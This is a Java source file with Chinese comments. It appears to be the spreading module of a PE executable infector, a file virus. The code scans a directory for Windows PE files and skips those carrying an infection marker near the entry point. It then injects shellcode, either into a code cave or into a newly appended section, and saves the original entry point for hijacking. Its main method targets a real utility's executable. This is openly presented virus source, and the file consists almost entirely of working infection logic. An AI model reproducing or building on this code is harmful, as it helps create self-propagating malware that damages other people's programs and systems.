/*
 * @Descripttion: your project
 * @version: 1.0
 * @Author: Yhank
 * @Date: 2021-10-20 00:32:30
 * @LastEditors: Yhank
 * @LastEditTime: 2021-11-02 17:57:50
 */
package SpreadModule;

import FileFormatModule.*;
import java.util.ArrayList;
import java.util.Arrays;
import UseFunction.UF;
import java.io.*;
import InjectModule.*;

public class Spreader {

    public ArrayList<FileFormater> ffs = new ArrayList<>();
    UF uf = new UF();
    int count = 0;
    AbstractInjecter injectMethod = null;

    public static void main(String[] args) {
        String filePath = "./resource/WizTree.exe";
        Spreader s = new Spreader(filePath);
        AbstractInjecter injecter = s.wantInjecterB(s.ffs.get(0));
        injecter.inject();
    }

    public Spreader(String inputPath) {
        ffsAddItem(new File(inputPath));
    }

    public Spreader(File inputFile) {
        // 感染一个目录下的所有文件, 或者感染一个特定的文件
        ffsAddItem(inputFile);
    }

    void ffsAddItem(File inputFile) {
        // 为构造器服务的函数，检查文件是否是pe文件以及是否已经被感染
        if (inputFile.isDirectory()) {
            // 假如是目录则感染该目录下的所有文件
            File[] fileList = inputFile.listFiles();
            for (int i = 0; i < fileList.length; i++) {
                if (fileList[i].isFile() && isPE(fileList[i])) {
                    FileFormater tmp = new FileFormater(fileList[i]);
                    if (isNotInfected(tmp)) {
                        ffs.add(tmp);
                    } else {
                        System.out.printf("路径：%s 已经被感染\n", fileList[i].getPath());
                    }
                } else {
                    System.out.printf("路径: %s 不是pe文件\n", fileList[i].getPath());
                }
            }
        } else if (inputFile.isFile()) {
            // 假如是一个文件
            if (isPE(inputFile)) {
                FileFormater tmp = new FileFormater(inputFile);
                if (isNotInfected(tmp)) {
                    ffs.add(tmp);
                } else {
                    System.out.printf("路径：%s 已经被感染\n", inputFile.getPath());
                }
            } else {
                System.out.printf("路径: %s 不是pe文件\n", inputFile.getPath());
            }
        }

    }

    public void callInject() {
        int ret = 0;
        for (FileFormater i : ffs) {
            injectMethod = methodParser(i);
            ret = injectMethod.inject();
            System.out.printf("目标路径：%s ", i.desPath);
            if (injectMethod instanceof InjecterA)
                System.out.print("采用InjecterA ");
            else if (injectMethod instanceof InjecterB)
                System.out.print("采用InjecterB ");
            else {
                System.out.print("经过分析无法感染");
                continue;
            }
            if (ret == -1)
                System.out.println("出现IO错误");
            else if (ret == 0)
                System.out.println("新感染");
        }
    }

    AbstractInjecter wantInjecterA(FileFormater ff) {
        InjecterA ret = null;
        for (HoleData i : ff.holes) {
            if (AbstractInjecter.getShellCodeLength() + 8 < i.holeSize) {
                ret = new InjecterA(ff.desPath, i.holeStartRawOffset, i.holeStartRva, ff.aOEPRawStore,
                        ff.addressOfEntryPointRVA);
                break;
            }
        }
        return ret;
    }

    AbstractInjecter wantInjecterB(FileFormater ff) {
        InjecterB ret = null;
        try {
            RandomAccessFile raf = new RandomAccessFile(ff.desPath, "r");

            // 得到新节头起始
            long newSectionHeaderOffset = ff.sectionHeadersOffset + ff.sectionNum * ff.sectionHeaderSize;

            // 检查是否能使用第二种方法
            long totalSHSize = (long) Math.ceil((double) (newSectionHeaderOffset - 1) / (double) ff.fileAlignment)
                    * ff.fileAlignment;
            long additonSpace = totalSHSize - newSectionHeaderOffset; // 这个区块剩余的空间
            if (additonSpace < ff.sectionHeaderSize) {
                raf.close(); // 不满足第二种注入方法
                return null;
            }

            // 得到新节的起始
            SectionData lastExistSection = getLastSection(ff.sectionDatas);
            long newSectionStartRawOffset = lastExistSection.getPointToRawData() + lastExistSection.getRawSize();

            // 得到新节rva起始
            long newSectionStartRva = (long) Math
                    .ceil((double) (lastExistSection.getRvaAddress() + lastExistSection.getPhisicalSize())
                            / (double) ff.sectionAlignment)
                    * ff.sectionAlignment;

            // 得到注入方法
            ret = new InjecterB(ff.desPath, ff.fileAlignment, ff.aOEPRawStore, ff.addressOfEntryPointRVA,
                    ff.fileHeaderOffset, ff.aOEPSizeOfImage, ff.sizeOfImage, newSectionHeaderOffset,
                    newSectionStartRawOffset, newSectionStartRva);

            raf.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return ret;
    }

    SectionData getLastSection(ArrayList<SectionData> sectionDatas) {
        SectionData ret = null;
        long maxStartRawOffset = 0;
        for (SectionData i : sectionDatas) {
            if (i.getPointToRawData() > maxStartRawOffset) {
                ret = i;
            }
        }
        return ret;
    }

    AbstractInjecter methodParser(FileFormater ff) {
        AbstractInjecter ret = null;
        ret = wantInjecterA(ff);
        if (ret instanceof InjecterA)
            return ret; // 假如返回了正确的形式

        // 假如不是就采用创立新节注入的方式
        ret = wantInjecterB(ff);
        return ret;
    }

    Boolean isPE(File file) {
        return isPE(file.getPath());
    }

    Boolean isPE(String filePath) {
        Boolean ret = false;
        byte[] peSignature = { (byte) 0x50, (byte) 0x45, (byte) 0x00, (byte) 0x00 };
        try {
            RandomAccessFile raf = new RandomAccessFile(filePath, "r");

            long peHeaderOffset = -1;
            // 获得peHeader的偏移
            byte[] readBuf1 = new byte[4];
            raf.seek(0x3c);
            raf.read(readBuf1);
            peHeaderOffset = uf.trans4Byte(readBuf1);

            byte[] readBuf2 = new byte[4];
            raf.seek(peHeaderOffset);
            raf.read(readBuf2);
            if (Arrays.equals(peSignature, readBuf2)) {
                ret = true;
            }
            raf.close();
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
        return ret;
    }

    Boolean isNotInfected(FileFormater ff) {
        Boolean ret = false;
        // 检查是否已经被感染
        try {
            RandomAccessFile raf = new RandomAccessFile(ff.desPath, "r");
            // 检查感染标记
            byte[] readBuf = new byte[4];
            raf.seek(ff.addressOfEntryPointRaw - 0x4);
            raf.read(readBuf);
            if (!Arrays.equals(readBuf, AbstractInjecter.isInfectedSignture))
                ret = true; // 字符串不同则不相等, 则还没有感染
            raf.close();
        } catch (IOException e) {
            e.printStackTrace();
            // 以防万一
            ret = false;
        }
        return ret;
    }

}
/*
 * @Descripttion: your project
 * 
 * @version: 1.0
 * 
 * @Author: Yhank
 * 
 * @Date: 2021-10-20 00:32:30
 * 
 * @LastEditors: Yhank
 * 
 * @LastEditTime: 2021-10-21 10:33:52
 */
